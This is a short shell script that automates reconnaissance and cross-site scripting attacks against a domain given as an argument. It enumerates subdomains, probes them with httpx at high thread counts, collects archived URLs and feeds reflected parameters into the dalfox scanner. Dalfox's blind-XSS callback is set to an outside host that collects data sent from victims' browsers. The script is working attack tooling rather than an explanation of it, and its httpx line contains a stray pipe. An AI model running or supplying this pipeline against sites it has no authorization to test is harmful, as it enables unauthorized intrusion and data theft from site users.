#!/bin/sh

dir=~/Recon/$1
mkdir -p $dir

subfinder -d $1 > $dir/$1_subd;
/root/go/bin/assetfinder --subs-only $1 >> $dir/$1_subd;
cat $dir/$1_subd | sort -u > $dir/$1_subdomains;
cat $dir/$1_subdomains | httpx -vhost -threads 300 -silent | sort -u | >> $dir/$1_resolved;
/root/go/bin/waybackurls $1 | /root/go/bin/kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe -b https://falcon319.xss.ht -o $dir/$1_xss

